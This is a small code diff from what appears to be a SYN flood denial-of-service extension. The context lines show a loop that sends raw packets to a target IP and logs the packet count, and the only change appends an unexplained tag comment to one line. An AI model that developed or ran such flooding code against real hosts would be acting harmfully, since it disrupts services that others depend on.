@@ -61,7 +61,7 @@ class SYNFloodExtension(BaseExtension):
                     sock.sendto(packet, (target_ip, 0))
                     packet_count += 1
 
-                    if packet_count % packet_rate == 0:
+                    if packet_count % packet_rate == 0:  #5YcgaD
                         self.logger.debug(f"Sent {packet_count} packets...")
 
                     time.sleep(interval)
